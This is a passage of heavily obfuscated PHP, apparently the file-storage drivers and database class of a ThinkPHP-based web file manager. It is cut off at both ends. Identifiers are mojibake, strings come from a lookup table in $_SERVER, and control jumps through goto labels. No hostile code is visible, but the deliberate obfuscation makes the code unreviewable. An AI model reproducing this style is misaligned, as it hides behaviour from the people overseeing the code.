fileSubstr($ªµˆóĞÉ, $ÚÅ¿„‡­ = 0, $Ã‚™•— = -1) { $µûãØç„ =& $_SERVER[Ü©»’·]; $ó‹²©×Ô = $this->info($ªµˆóĞÉ); if (!$ó‹²©×Ô || !$ó‹²©×Ô[$µûãØç„[201]] && $ó‹²©×Ô[$µûãØç„[76]] > 1024 * 1024 * 10) { return !1; } if ($Ã‚™•— === -1) { $Ã‚™•— = $ó‹²©×Ô[$µûãØç„[76]]; } if ($Ã‚™•— == 0) { return $µûãØç„[12]; } $ì’Ì±ˆ = array($µûãØç„[1515] . $ÚÅ¿„‡­ . $µûãØç„[788] . ($ÚÅ¿„‡­ + $Ã‚™•— - 1)); $Œùã¥ÏÒ = url_request($ªµˆóĞÉ, $µûãØç„[230], !1, $ì’Ì±ˆ, !1, !1, 30); return $Œùã¥ÏÒ[$µûãØç„[1206]] ? $Œùã¥ÏÒ[$µûãØç„[1206]] : $µûãØç„[12]; } public function download($Èæ§À£û, $Œ¦¤»Á) { Downloader::start($Èæ§À£û, $Œ¦¤»Á); return $Œ¦¤»Á; } } goto cé«¡Ìãâ; DÒò³…Ï™·: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ıŒùÄ¨) { parent::__construct($ıŒùÄ¨); $this->signatureVersion($_SERVER[Ü©»’·][216]); } public function uploadFormData($ªÎŞıÂ, $ìòşòêõ = 3600) { $ÁÚ˜¬ªã =& $_SERVER[Ü©»’·]; $ü×ô’¬£ = $ÁÚ˜¬ªã[198]; $¢à¹·Âü = $ÁÚ˜¬ªã[232]; $œıÆ¹æ¶ = $ÁÚ˜¬ªã[1322]; $ºËĞ‚ï = gmdate($ÁÚ˜¬ªã[1323], time() + $ìòşòêõ); $Ú¨ù…§¶ = (string) time() . $ÁÚ˜¬ªã[71] . (string) (time() + $ìòşòêõ); $‰÷«û¸ = array($ÁÚ˜¬ªã[1324] => $ºËĞ‚ï, $ÁÚ˜¬ªã[1325] => array(array($ÁÚ˜¬ªã[1326] => $ü×ô’¬£), array($ÁÚ˜¬ªã[1327] => $this->bucket), array($ÁÚ˜¬ªã[1328], $ÁÚ˜¬ªã[1329], $ÁÚ˜¬ªã[12]), array($ÁÚ˜¬ªã[1330] => $œıÆ¹æ¶), array($ÁÚ˜¬ªã[1331] => $¢à¹·Âü), array($ÁÚ˜¬ªã[1332] => $this->accessKey), array($ÁÚ˜¬ªã[1333] => $Ú¨ù…§¶))); $‰÷«û¸ = json_encode($‰÷«û¸); $³¥í‘ = hash_hmac($ÁÚ˜¬ªã[232], $Ú¨ù…§¶, $this->secret); $ıÁ­Â‹š = sha1($‰÷«û¸); $Šß¢®è = hash_hmac($ÁÚ˜¬ªã[232], $ıÁ­Â‹š, $³¥í‘); $™ø¸‰× = array($ÁÚ˜¬ªã[1326] => $ü×ô’¬£, $ÁÚ˜¬ªã[1330] => $œıÆ¹æ¶, $ÁÚ˜¬ªã[1334] => base64_encode($‰÷«û¸), $ÁÚ˜¬ªã[1331] => $¢à¹·Âü, $ÁÚ˜¬ªã[1332] => $this->accessKey, $ÁÚ˜¬ªã[1335] => $Ú¨ù…§¶, $ÁÚ˜¬ªã[1336] => $Šß¢®è, $ÁÚ˜¬ªã[181] => $this->getHost()); return $™ø¸‰×; } public function fileOutLink($ŞšÚ‡) { $Ìèâ÷±ı =& $_SERVER[Ü©»’·]; if (substr($ŞšÚ‡, 0, 7) == $Ìèâ÷±ı[1337]) { $ŞšÚ‡ = $Ìèâ÷±ı[1338] . substr($ŞšÚ‡, 7); } header($Ìèâ÷±ı[161] . $ŞšÚ‡); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Œ¨¡òáŸ) { $this->pathParse = $Œ¨¡òáŸ; $this->model = Model($_SERVER[Ü©»’·][1339]); } public function getPath($Ø­·ÄáŠ) { return trim($Ø­·ÄáŠ, $_SERVER[Ü©»’·][8]); } public function pathFather($â€Øêêº) { $Åµ®£òú = $this->parse($â€Øêêº); $Åµ®£òú = $this->infoSimple($â€Øêêº); return $Åµ®£òú ? $Åµ®£òú[$_SERVER[Ü©»’·][441]] : !1; } public function pathThis($ê­îÚ¢¨) { $Ò’ÔÍøÄ = $this->infoSimple($ê­îÚ¢¨); return $Ò’ÔÍøÄ ? $Ò’ÔÍøÄ[$_SERVER[Ü©»’·][32]] : !1; } public function getPathOuter($ûëığÃ) { if (!$ûëığÃ) { return $ûëığÃ; } $ÚµÇ÷Ğ = $this->parse($ûëığÃ); return KodIO::make($ÚµÇ÷Ğ[$_SERVER[Ü©»’·][408]]); } public function copyFolderFromIO($„éæÈò„, $ÁÈ£Ş’È, $•é‹Óğ, $ä³Û§¶Ñ, $Ï¡çÅ°Õ) { $Ö¹ùÜ = $this->model->copyFolderFromIO($„éæÈò„, $ÁÈ£Ş’È, $•é‹Óğ, $ä³Û§¶Ñ, $Ï¡çÅ°Õ); return KodIO::make($Ö¹ùÜ); } public function isParentOf($‹àïƒ¿, $¦÷èË»˜) { return $this->model->isParentOf($‹àïƒ¿, $¦÷èË»˜); } public function mkfile($Øú‹Äı, $úãâó³” = '', $œãôÕùè = REPEAT_RENAME) { $—Ñêñ«‡ =& $_SERVER[Ü©»’·]; $ÌÅµÖ€ = $this->parse($Øú‹Äı); $Øú‹Äı = $ÌÅµÖ€[$—Ñêñ«‡[408]]; for ($ÍªÜïâ = 0; $ÍªÜïâ < count($ÌÅµÖ€[$—Ñêñ«‡[1340]]); $ÍªÜïâ++) { $¿áãèûÀ = $ÌÅµÖ€[$—Ñêñ«‡[1340]][$ÍªÜïâ]; if ($ÍªÜïâ == count($ÌÅµÖ€[$—Ñêñ«‡[1340]]) - 1) { $Øú‹Äı = $this->model->mkfile($Øú‹Äı, $¿áãèûÀ, $úãâó³”, $œãôÕùè); break; } $Øú‹Äı = $this->model->mkdir($Øú‹Äı, $¿áãèûÀ, REPEAT_SKIP); } return $this->getPathOuter($Øú‹Äı); } public function mkdir($ïõàïÍò, $¸â™È™ñ = REPEAT_SKIP) { $ë±ÆÃ€œ =& $_SERVER[Ü©»’·]; $²Õ±­˜Ì = $this->parse($ïõàïÍò); $ïõàïÍò = $²Õ±­˜Ì[$ë±ÆÃ€œ[408]]; for ($áßÊ¡Î = 0; $áßÊ¡Î < count($²Õ±­˜Ì[$ë±ÆÃ€œ[1340]]); $áßÊ¡Î++) { $Ø÷ç¡» = $²Õ±­˜Ì[$ë±ÆÃ€œ[1340]][$áßÊ¡Î]; $ïõàïÍò = $this->model->mkdir($ïõàïÍò, $Ø÷ç¡», $¸â™È™ñ); } return $this->getPathOuter($ïõàïÍò); } public function copyFile($ëâõØœ, $ÂäÈÛóÜ, $ÊĞñ‰Ñä = REPEAT_REPLACE) { $Ğüû¥Á‰ =& $_SERVER[Ü©»’·]; $Ãâ˜¶¬ß = $this->parse($ÂäÈÛóÜ); $Ï¶“¬­ = $this->model->copy($ëâõØœ, $Ãâ˜¶¬ß[$Ğüû¥Á‰[408]], $ÊĞñ‰Ñä, $Ãâ˜¶¬ß[$Ğüû¥Á‰[84]]); return $Ï¶“¬­ ? $this->getPathOuter($Ï¶“¬­) : !1; } public function moveFile($Šì÷†ÄÆ, $¬ş¯Û¹, $ÚŠó¦¼» = REPEAT_REPLACE) { $Û­Şƒéõ =& $_SERVER[Ü©»’·]; $°¬ê©ºâ = $this->parse($¬ş¯Û¹); $‡’©¿ğº = $this->model->move($Šì÷†ÄÆ, $°¬ê©ºâ[$Û­Şƒéõ[408]], $ÚŠó¦¼», $°¬ê©ºâ[$Û­Şƒéõ[84]]); return $‡’©¿ğº ? $this->getPathOuter($‡’©¿ğº) : !1; } public function copy($Ø•åïöä, $îù£¶, $ÈÓÉË½ = REPEAT_REPLACE, $øİğöõ = false) { $˜€„İ¡° = $this->parse($îù£¶); $¶¯Üè = $this->model->copy($Ø•åïöä, $˜€„İ¡°[$_SERVER[Ü©»’·][408]], $ÈÓÉË½, $øİğöõ); return $¶¯Üè ? $this->getPathOuter($¶¯Üè) : !1; } public function moveSameAllow() { } public function move($ˆø„Ê€, $–â“šÅ’, $–¡‘ôŞ = REPEAT_REPLACE, $ÎæÇòº² = false) { $”ÓÜª¢ = $this->parse($–â“šÅ’); $üĞ§¢èÄ = $this->model->move($ˆø„Ê€, $”ÓÜª¢[$_SERVER[Ü©»’·][408]], $–¡‘ôŞ, $ÎæÇòº²); return $üĞ§¢èÄ ? $this->getPathOuter($üĞ§¢èÄ) : !1; } public function remove($ªÇ„Á’, $ ïìØ©¸ = true) { return $this->model->remove($ªÇ„Á’, $ ïìØ©¸); } public function rename($ß½³÷õ, $¸‹å§–) { $±ÓÚáÁõ = $this->model->rename($ß½³÷õ, $¸‹å§–); return $±ÓÚáÁõ ? $this->getPathOuter($ß½³÷õ) : $±ÓÚáÁõ; } public function size($˜öÁê´ü) { $”¥“ØÙ¡ = $this->infoSimple($˜öÁê´ü); return $”¥“ØÙ¡ ? $”¥“ØÙ¡[$_SERVER[Ü©»’·][76]] : 0; } public function infoSimple($§÷í¨°Î) { return $this->model->sourceInfo($§÷í¨°Î); } public function info($âÆû£¬) { return $this->infoParse($âÆû£¬); } public function infoAuth($À«½ÎŠ) { return $this->infoParse($À«½ÎŠ, !1, !0); } public function infoWithChildren($òî¥šì°) { return $this->infoParse($òî¥šì°, !0); } protected function infoParse($†­Ö¡ô, $½¹¢ÀË = false, $„¢¬“ë = false) { if (!$½¹¢ÀË) { return $this->model->pathInfo($†­Ö¡ô, $„¢¬“ë); } return $this->model->pathInfoMore($†­Ö¡ô); } public function infoFull($Ê•Æ÷üß) { $œ¬¹¸¨§ =& $_SERVER[Ü©»’·]; $†Ë÷ŞÌ“ = explode($œ¬¹¸¨§[8], $Ê•Æ÷üß); $ş‹Ü¦‡Ì = implode($œ¬¹¸¨§[8], array_splice($†Ë÷ŞÌ“, 1)); return $this->model->pathInfoByPath($†Ë÷ŞÌ“[0], $ş‹Ü¦‡Ì); } public function hashSimple($¾‚¡‘­¾) { $ŞÅç§É¯ =& $_SERVER[Ü©»’·]; $¢ÓÚÆ© = $this->infoWithChildren($¾‚¡‘­¾); return $¢ÓÚÆ©[$ŞÅç§É¯[170]][$ŞÅç§É¯[177]]; } public function hashMd5($®æ­âûŞ) { $ã›ïúÇ† =& $_SERVER[Ü©»’·]; $åº¹ê• = $this->infoWithChildren($®æ­âûŞ); return $åº¹ê•[$ã›ïúÇ†[170]][$ã›ïúÇ†[176]]; } public function exist($ğ£µ³»¢) { $ŒÚëÆŸ¹ =& $_SERVER[Ü©»’·]; $Ñì¾¦ˆ = $this->parse($ğ£µ³»¢); if (!$Ñì¾¦ˆ[$ŒÚëÆŸ¹[84]]) { return $this->isFile($ğ£µ³»¢) || $this->isFolder($ğ£µ³»¢); } $Ó‰ÉÛ­® = array($ŒÚëÆŸ¹[410] => $Ñì¾¦ˆ[$ŒÚëÆŸ¹[408]], $ŒÚëÆŸ¹[32] => $Ñì¾¦ˆ[$ŒÚëÆŸ¹[84]]); $ôõğ×±Í = $this->model->where($Ó‰ÉÛ­®)->find(); return $ôõğ×±Í ? !0 : !1; } public function isFile($›™íÅ) { $µàüÅ¥­ =& $_SERVER[Ü©»’·]; $¤ÑÃÙ§™ = $this->infoSimple($›™íÅ); return $¤ÑÃÙ§™ && $¤ÑÃÙ§™[$µàüÅ¥­[419]] == $µàüÅ¥­[88] ? !1 : !0; } public function isFolder($èÒ•Ñà) { $à×ù¼ı =& $_SERVER[Ü©»’·]; $Øñ¯É×‹ = $this->infoSimple($èÒ•Ñà); return $Øñ¯É×‹ && $Øñ¯É×‹[$à×ù¼ı[419]] == $à×ù¼ı[88] ? !0 : !1; } public function listPath($ÊÏÌÌºƒ, $·é›ø¬Ÿ = false) { $çÕÔ¸™ú =& $_SERVER[Ü©»’·]; if ($ÊÏÌÌºƒ == $çÕÔ¸™ú[12]) { return !1; } $á€­ïåü = array($çÕÔ¸™ú[410] => $ÊÏÌÌºƒ); if ($·é›ø¬Ÿ) { return $this->model->listSource($á€­ïåü, -1); } return $this->model->listSource($á€­ïåü); } public function has($ÔàÕÁ‘©, $Ş¬­¿á¡ = false, $úˆ§—şã = null) { $¤¬åæª =& $_SERVER[Ü©»’·]; $½€®¡ÕÕ = $this->infoWithChildren($ÔàÕÁ‘©); if ($Ş¬­¿á¡) { return array($¤¬åæª[208] => $½€®¡ÕÕ[$¤¬åæª[208]], $¤¬åæª[207] => $½€®¡ÕÕ[$¤¬åæª[207]]); } return $úˆ§—şã ? $½€®¡ÕÕ[$¤¬åæª[208]] : $½€®¡ÕÕ[$¤¬åæª[207]]; } public function listAll($Œñã˜…€) { $Õä «Ñ = IO::info($this->pathParse[$_SERVER[Ü©»’·][84]]); if (!$Õä «Ñ) { return array(); } return $this->model->listAll($Œñã˜…€); } public function getContent($Ã«ÒÛä¨) { return $this->model->getContent($Ã«ÒÛä¨); } public function setContent($ñîöÌëâ, $Ê¿ïïßò = '') { return $this->model->setContent($ñîöÌëâ, $Ê¿ïïßò); } public function fileSubstr($ö¹°ò¶Õ, $”ÙˆúáÕ, $£õÇú‹¶) { return $this->model->fileSubstr($ö¹°ò¶Õ, $”ÙˆúáÕ, $£õÇú‹¶); } public function download($Ó¤¢‹ü¬, $åäÈŒ = '') { $ÛéÊ’¸ = get_path_father($åäÈŒ); $‚ ­ø³ = get_path_this($åäÈŒ); $íäÓ½›“ = $this->model->fileInfoGet($Ó¤¢‹ü¬); $§ÖáİÕ‰ = IO::copy($íäÓ½›“[$_SERVER[Ü©»’·][84]], $ÛéÊ’¸, !1, $‚ ­ø³); return $§ÖáİÕ‰; } public function setModifyTime($€ª†µ®, $¤çÌ”¿Ô = '') { $©Äéğ½ =& $_SERVER[Ü©»’·]; if (!$€ª†µ®) { return; } $this->model->where(array($©Äéğ½[426] => $€ª†µ®))->save(array($©Äéğ½[85] => $¤çÌ”¿Ô)); } public function upload($î««ï‚, $æ‰áæêâ, $ ¡È ¯÷ = false, $¢ˆ·ó¤¡ = REPEAT_REPLACE) { $à¡œ¡ä‚ =& $_SERVER[Ü©»’·]; $åà–ÅÖ = $this->parse($î««ï‚); $îåçø©¿ = $this->model->addFile($åà–ÅÖ[$à¡œ¡ä‚[408]], $æ‰áæêâ, $åà–ÅÖ[$à¡œ¡ä‚[84]], $ ¡È ¯÷, $¢ˆ·ó¤¡); return $this->getPathOuter($îåçø©¿); } public function uploadFileByID($È¢Ü˜Û, $  «¦», $üÃßû²Š) { $íñÏØ§ =& $_SERVER[Ü©»’·]; $± ‹Àß¬ = $this->parse($È¢Ü˜Û); $¬ôÍ™ê = $this->model->addFileByFileID($± ‹Àß¬[$íñÏØ§[408]], $  «¦», $± ‹Àß¬[$íñÏØ§[84]], $üÃßû²Š); return $this->getPathOuter($¬ôÍ™ê); } public function addFileByRemote($ ›¢˜Æ, $Ïãˆ‡Ê€, $± —–È = array(), $“ñ¾¯ëÖ = '', $ä‚ö©…â) { $¦Ø€Û»‹ =& $_SERVER[Ü©»’·]; $¦É§ëË = $this->parse($ ›¢˜Æ); $“ñ¾¯ëÖ = empty($“ñ¾¯ëÖ) ? $¦É§ëË[$¦Ø€Û»‹[84]] : $“ñ¾¯ëÖ; $®˜¯ç¥ß = $this->model->addFileByRemote($¦É§ëË[$¦Ø€Û»‹[408]], $Ïãˆ‡Ê€, $“ñ¾¯ëÖ, $± —–È, $ä‚ö©…â); return $this->getPathOuter($®˜¯ç¥ß); } public function uploadLink($›ÛŸ·–, $Á—²ß¾¸ = 0) { $šÃá›ìŸ =& $_SERVER[Ü©»’·]; $×ñ¥¦Èû = $this->parse($›ÛŸ·–); $ÃŒ£ö¡ = _get($GLOBALS[$šÃá›ìŸ[7]], $šÃá›ìŸ[1341]); $±ÕµÒÏ = _get($GLOBALS[$šÃá›ìŸ[7]], $šÃá›ìŸ[1342]); $›ÛŸ·– = Model($šÃá›ìŸ[618])->createFileName($×ñ¥¦Èû[$šÃá›ìŸ[84]], $ÃŒ£ö¡, $±ÕµÒÏ); return IO::uploadLink($›ÛŸ·–, $Á—²ß¾¸); } public function fileNameAuto($»×éÂæ, $Ó€€Íá, $¨Ò´‹® = REPEAT_REPLACE, $šº–» = false) { return $this->model->fileNameAuto($»×éÂæ, $Ó€€Íá, $¨Ò´‹®, $šº–»); } public function fileNameExist($ıõóÛœí, $Æ»ÂÖÔ) { return $this->model->fileNameExist($ıõóÛœí, $Æ»ÂÖÔ); } protected function _fileOut($ÃÕ€ã°Å, $Êïçõ† = false, $ğ‘ÒÚª = false, $õ¨æàïæ = '', $î…ÑÛÒÏ = false) { $¾öÒÏ— =& $_SERVER[Ü©»’·]; $¤Ïâ¯¿ = $this->model->sourceInfo($ÃÕ€ã°Å); if ($¤Ïâ¯¿[$¾öÒÏ—[419]] == $¾öÒÏ—[88]) { header($¾öÒÏ—[1343]); die; } $…³’ÀÑ = $this->model->fileInfoGet($ÃÕ€ã°Å); $õ¨æàïæ = $…³’ÀÑ[$¾öÒÏ—[176]] ? $…³’ÀÑ[$¾öÒÏ—[176]] : $õ¨æàïæ; $Î°çº†• = isset($GLOBALS[$¾öÒÏ—[1344]]) ? $GLOBALS[$¾öÒÏ—[1344]] : $¤Ïâ¯¿[$¾öÒÏ—[32]]; if ($î…ÑÛÒÏ) { return IO::fileOutServer($…³’ÀÑ[$¾öÒÏ—[84]], $Êïçõ†, $Î°çº†•, $õ¨æàïæ); } IO::fileOut($…³’ÀÑ[$¾öÒÏ—[84]], $Êïçõ†, $Î°çº†•, $õ¨æàïæ); } public function fileOut($ÀÒ¢’¼, $ó’»û‹ = false, $‹ÂĞû = false, $µÉ‹±œ = '') { $this->_fileOut($ÀÒ¢’¼, $ó’»û‹, $‹ÂĞû, $µÉ‹±œ); } public function fileOutServer($‡©Ø²¶·, $åòáÅËä = false, $Å’â¬ = false, $Ã‡ãÎÈû = '') { $this->_fileOut($‡©Ø²¶·, $åòáÅËä, $Å’â¬, $Ã‡ãÎÈû, !0); } protected function _fileOutImage($¥ù²Îø¿, $ŒÊ¤ğ‘Ò = 250) { $µÌÑêÀ =& $_SERVER[Ü©»’·]; $È—¯¿ü¥ = $this->model->pathInfo($¥ù²Îø¿); if ($È—¯¿ü¥[$µÌÑêÀ[419]] == $µÌÑêÀ[88]) { show_json($µÌÑêÀ[1345] . $¥ù²Îø¿, !1); } $êÕàšü = $this->model->fileInfoGet($¥ù²Îø¿); $êÕàšü[$µÌÑêÀ[32]] = $È—¯¿ü¥[$µÌÑêÀ[32]]; $êÕàšü[$µÌÑêÀ[169]] = $È—¯¿ü¥[$µÌÑêÀ[169]]; $GLOBALS[$µÌÑêÀ[1344]] = $êÕàšü[$µÌÑêÀ[32]]; $GLOBALS[$µÌÑêÀ[168]] = $êÕàšü; IO::fileOutImage($êÕàšü[$µÌÑêÀ[84]], $ŒÊ¤ğ‘Ò); } public function fileOutImage($ïÇÜùå, $™şÍËÀ‰ = 250) { $this->_fileOutImage($ïÇÜùå, $™şÍËÀ‰); } public function fileOutImageServer($ÇúÑ°÷, $¤ÙĞ™Â¦ = 250) { $this->_fileOutImage($ÇúÑ°÷, $¤ÙĞ™Â¦); } public function link($‰‚©åŞú, $µöÜĞ¹’ = '') { $ƒÑÌÄı’ = $this->model->fileInfoGet($‰‚©åŞú); return IO::link($ƒÑÌÄı’[$_SERVER[Ü©»’·][84]], $µöÜĞ¹’); } protected function parse($ŞÂÔß¿ò) { $ªĞÀéê =& $_SERVER[Ü©»’·]; if (strstr($ŞÂÔß¿ò, $ªĞÀéê[8]) === !1) { return array($ªĞÀéê[428] => intval($ŞÂÔß¿ò), $ªĞÀéê[84] => $ªĞÀéê[12], $ªĞÀéê[1340] => array()); } $øâçİÄ = explode($ªĞÀéê[8], trim($ŞÂÔß¿ò, $ªĞÀéê[8])); if (count($øâçİÄ) < 2) { show_tips(clear_html($ŞÂÔß¿ò) . $ªĞÀéê[1346]); } return array($ªĞÀéê[428] => intval($øâçİÄ[0]), $ªĞÀéê[84] => $øâçİÄ[1], $ªĞÀéê[1340] => array_slice($øâçİÄ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÖÍéšø©) { $this->pathParse = $ÖÍéšø©; $this->model = Model($_SERVER[Ü©»’·][1339]); } public function getPathOuter($ ²³ñ©) { $¹ÙğÂôˆ =& $_SERVER[Ü©»’·]; if (!$ ²³ñ©) { return $ ²³ñ©; } $›»ïå©„ = $this->parse($ ²³ñ©); return trim(KodIO::makeShare($this->pathParse[$¹ÙğÂôˆ[408]], $›»ïå©„[$¹ÙğÂôˆ[408]]), $¹ÙğÂôˆ[8]); } protected function infoParse($ñ¥€ÏµÉ, $¶üàÆ = false, $­½±ÆãË = false) { $ÃÃÄÀÅÉ =& $_SERVER[Ü©»’·]; $ïó…‘î³ = $this->pathParse[$ÃÃÄÀÅÉ[408]]; $Æ°¸À¿ƒ = trim($this->pathParse[$ÃÃÄÀÅÉ[1172]], $ÃÃÄÀÅÉ[8]); return Action($ÃÃÄÀÅÉ[1347])->sharePathInfo($ïó…‘î³, $Æ°¸À¿ƒ, $¶üàÆ); } public function infoFull($ãÑ·…Õ) { $—î°ƒ² =& $_SERVER[Ü©»’·]; $™ğç™áÕ = explode($—î°ƒ²[8], trim($ãÑ·…Õ, $—î°ƒ²[8])); if (count($™ğç™áÕ) > 1) { $åÎ¯¶Ï€ = implode($—î°ƒ²[8], array_splice($™ğç™áÕ, 1)); $€ŠÅÙ­ê = $this->model->pathInfoByPath($™ğç™áÕ[0], $åÎ¯¶Ï€); if (!$€ŠÅÙ­ê) { return !1; } $this->pathParse[$—î°ƒ²[1172]] = $€ŠÅÙ­ê[$—î°ƒ²[411]]; } return $this->infoParse($ãÑ·…Õ); } public function listAll($ç³™ùÈ) { $Õ×ğûœÊ =& $_SERVER[Ü©»’·]; $£”˜®î† = IO::info($this->pathParse[$Õ×ğûœÊ[84]]); if (!$£”˜®î†) { return array(); } $¦©à¼Ü = $this->model->listAll($ç³™ùÈ); $Õ²–ò“Õ = Model($Õ×ğûœÊ[610])->getInfo($£”˜®î†[$Õ×ğûœÊ[498]]); $¾€©úı£ = Action($Õ×ğûœÊ[1347]); foreach ($¦©à¼Ü as &$Í›†Á) { check_abort(); $Í›†Á[$Õ×ğûœÊ[86]] = $¾€©úı£->_shareItemeParse($Í›†Á[$Õ×ğûœÊ[86]], $Õ²–ò“Õ); } unset($Í›†Á); return $¦©à¼Ü; } } goto fÙéñàƒè÷; c‚Ã­ê‡Ûğ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\156\x65\161" => "\74\x3e", "\147\164" => "\76", "\145\x67\x74" => "\x3e\75", "\x6c\x74" => "\x3c", "\145\x6c\164" => "\74\75", "\156\157\164\x6c\151\x6b\145" => "\x4e\x4f\124\40\114\111\113\x45", "\154\x69\x6b\145" => "\114\x49\x4b\105", "\151\x6e" => "\x49\x4e", "\156\x6f\164\x69\156" => "\116\117\124\40\111\x4e", "\x6e\x6f\164\x20\151\x6e" => "\x4e\x4f\124\x20\x49\x4e", "\x62\145\164\167\x65\145\x6e" => "\x42\105\124\x57\105\105\x4e", "\156\157\164\x62\145\x74\x77\145\145\156" => "\116\x4f\x54\x20\102\x45\x54\x57\105\x45\116", "\156\157\x74\x20\x62\x65\164\x77\145\145\156" => "\x4e\117\124\40\x42\x45\x54\x57\105\x45\x4e"); protected $selectSql = "\123\x45\114\x45\103\x54\x25\x44\111\123\124\x49\116\103\x54\x25\40\x25\x46\x49\105\x4c\104\45\40\106\122\117\x4d\x20\x25\124\101\x42\x4c\x45\45\45\x4a\x4f\111\x4e\45\x25\127\110\x45\122\x45\45\x25\107\x52\x4f\x55\120\45\x25\x48\101\126\x49\x4e\107\45\x25\x4f\122\x44\x45\x52\45\x25\114\111\115\111\x54\x25\40\45\x55\116\111\x4f\116\x25\45\103\117\115\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $äŒèÎ¥Ø = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ü©»’·][963], $äŒèÎ¥Ø); } public function factory($©Œ–Æ’ = '') { $¤šß¢ğ =& $_SERVER[Ü©»’·]; $©Œ–Æ’ = $this->parseConfig($©Œ–Æ’); if (empty($©Œ–Æ’[$¤šß¢ğ[964]])) { think_exception(think_lang($¤šß¢ğ[965])); } $this->dbType = ucwords(strtolower($©Œ–Æ’[$¤šß¢ğ[964]])); $³¦²İŸÓ = $¤šß¢ğ[966] . $this->dbType; if (class_exists($³¦²İŸÓ)) { $ûĞ¸éõ¶ = new $³¦²İŸÓ($©Œ–Æ’); if ($¤šß¢ğ[967] != strtolower($©Œ–Æ’[$¤šß¢ğ[964]])) { $ûĞ¸éõ¶->dbType = strtoupper($this->dbType); } else { $ûĞ¸éõ¶->dbType = $this->_getDsnType($©Œ–Æ’[$¤šß¢ğ[919]]); } } else { think_exception(think_lang($¤šß¢ğ[968]) . $¤šß¢ğ[969] . $³¦²İŸÓ); } return $ûĞ¸éõ¶; } public function __call($ºŒ—Ğº, $ÙÉ±†œ») { if (method_exists($this, $ºŒ—Ğº)) { return call_user_func_array(array($this, $ºŒ—Ğº), $ÙÉ±†œ»); } } protected function _getDsnType($ì‘†°Ø½) { $æ–ÓÆŸ = explode($_SERVER[Ü©»’·][4], $ì‘†°Ø½); $–äËù± = strtoupper(trim($æ–ÓÆŸ[0])); return $–äËù±; } private function parseConfig($²Àí‹Æá = '') { $ïÇ®ìíÕ =& $_SERVER[Ü©»’·]; if (!empty($²Àí‹Æá) && is_string($²Àí‹Æá)) { $²Àí‹Æá = $this->parseDSN($²Àí‹Æá); } elseif (is_array($²Àí‹Æá)) { $²Àí‹Æá = array_change_key_case($²Àí‹Æá); $²Àí‹Æá = array($ïÇ®ìíÕ[964] => $²Àí‹Æá[$ïÇ®ìíÕ[970]], $ïÇ®ìíÕ[891] => $²Àí‹Æá[$ïÇ®ìíÕ[971]], $ïÇ®ìíÕ[892] => $²Àí‹Æá[$ïÇ®ìíÕ[972]], $ïÇ®ìíÕ[889] => $²Àí‹Æá[$ïÇ®ìíÕ[973]], $ïÇ®ìíÕ[890] => $²Àí‹Æá[$ïÇ®ìíÕ[974]], $ïÇ®ìíÕ[21] => $²Àí‹Æá[$ïÇ®ìíÕ[975]], $ïÇ®ìíÕ[919] => $²Àí‹Æá[$ïÇ®ìíÕ[976]], $ïÇ®ìíÕ[17] => isset($²Àí‹Æá[$ïÇ®ìíÕ[977]]) ? $²Àí‹Æá[$ïÇ®ìíÕ[977]] : array()); } elseif (empty($²Àí‹Æá)) { if (think_config($ïÇ®ìíÕ[978]) && $ïÇ®ìíÕ[967] != strtolower(think_config($ïÇ®ìíÕ[979]))) { $²Àí‹Æá = $this->parseDSN(think_config($ïÇ®ìíÕ[978])); } else { $²Àí‹Æá = array($ïÇ®ìíÕ[964] => think_config($ïÇ®ìíÕ[979]), $ïÇ®ìíÕ[891] => think_config($ïÇ®ìíÕ[980]), $ïÇ®ìíÕ[892] => think_config($ïÇ®ìíÕ[981]), $ïÇ®ìíÕ[889] => think_config($ïÇ®ìíÕ[982]), $ïÇ®ìíÕ[890] => think_config($ïÇ®ìíÕ[983]), $ïÇ®ìíÕ[21] => think_config($ïÇ®ìíÕ[246]), $ïÇ®ìíÕ[919] => think_config($ïÇ®ìíÕ[978]), $ïÇ®ìíÕ[17] => think_config($ïÇ®ìíÕ[984])); } } return $²Àí‹Æá; } protected function initConnect($Ù‰İ„Ö× = true) { if (1 == think_config($_SERVER[Ü©»’·][22])) { $this->_linkID = $this->multiConnect($Ù‰İ„Ö×); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ı¿¤™²¯ => $·í„£ò‡) { $this->_linkID = $·í„£ò‡; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ì—›·Ñª = false) { $èİ¬ñæ¾ =& $_SERVER[Ü©»’·]; static $ÖÈëÖˆ = array(); static $ğ½ÕÅÅ˜ = -1; if (empty($ÖÈëÖˆ)) { foreach ($this->config as $°»ƒˆŞ‰ => $ßèˆÇÚ) { $ÖÈëÖˆ[$°»ƒˆŞ‰] = explode($èİ¬ñæ¾[50], $ßèˆÇÚ); } } if (think_config($èİ¬ñæ¾[985])) { if ($ì—›·Ñª || think_config($èİ¬ñæ¾[404]) === !0) { $©ğ°÷›ã = floor(mt_rand(0, think_config($èİ¬ñæ¾[986]) - 1)); $ğ½ÕÅÅ˜ = $©ğ°÷›ã; } else { if (is_numeric(think_config($èİ¬ñæ¾[987]))) { $©ğ°÷›ã = think_config($èİ¬ñæ¾[987]); } else { $©ğ°÷›ã = floor(mt_rand(think_config($èİ¬ñæ¾[986]), count($ÖÈëÖˆ[$èİ¬ñæ¾[889]]) - 1)); } } } else { $©ğ°÷›ã = floor(mt_rand(0, count($ÖÈëÖˆ[$èİ¬ñæ¾[889]]) - 1)); $ğ½ÕÅÅ˜ = $©ğ°÷›ã; } $©ğ°÷›ã = $ğ½ÕÅÅ˜ !== -1 ? $ğ½ÕÅÅ˜ : $©ğ°÷›ã; $•è°šßØ = array($èİ¬ñæ¾[891] => isset($ÖÈëÖˆ[$èİ¬ñæ¾[891]][$©ğ°÷›ã]) ? 